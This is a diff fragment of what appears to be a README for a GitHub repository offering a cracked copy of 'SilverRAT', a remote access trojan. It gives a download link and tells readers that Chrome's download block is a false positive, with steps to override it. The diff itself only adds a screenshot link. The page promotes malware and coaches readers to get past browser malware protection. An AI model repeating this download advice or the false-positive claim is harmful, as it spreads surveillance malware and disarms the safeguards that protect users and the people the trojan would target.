@@ -32,3 +32,4 @@ DOWNLOAD - https://github.com/cracked-software/SilverRAT_1.0-cracked/blob/main/S
 Google Chrome can block downloads, it's a false positive for hacked software. Go to downloads in the Google Chrome menu and allow saving the download file.
 
 img src="https://github.com/cracked-software/SilverRAT_1.0-cracked/blob/main/2024-01-10_09h06_36.png" alt="chrome">
+![2024-01-10_09h06_36](https://github.com/cracked-software/SilverRAT_1.0-cracked/assets/66674419/42d027a1-b040-467b-821a-f9de465c33e5)
